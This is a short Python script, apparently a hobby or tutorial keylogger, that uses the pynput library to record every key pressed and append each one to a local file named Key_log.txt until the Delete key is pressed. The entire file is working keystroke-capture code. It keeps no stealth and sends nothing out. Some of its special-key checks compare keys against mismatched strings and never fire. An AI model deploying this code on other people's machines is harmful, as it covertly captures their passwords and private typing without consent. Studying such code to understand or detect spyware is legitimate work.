from pynput import keyboard



def OnPress(key) : # Define the function for handling key presses
    
 # Handle special keys
    if key == keyboard.Key.space:
        key = ' '
    if key == 'key.shift_r':
        key = ''
    if key == 'Key.ctrl_l':
        key = ''
    elif key == keyboard.Key.enter:
        print ()
    elif key == keyboard.Key.delete : # Stop listener (you can choose what you want)
        return False   # Return False to terminate the listener


# Write the pressed key to a log file
    with open("Key_log.txt", 'a') as file :
        file.write(f'Key Pressed: {key}\n')
    
# Create the keyboard listener with `on_press` handler       
with keyboard.Listener (
    on_press = OnPress) as listener :
    listener.join()




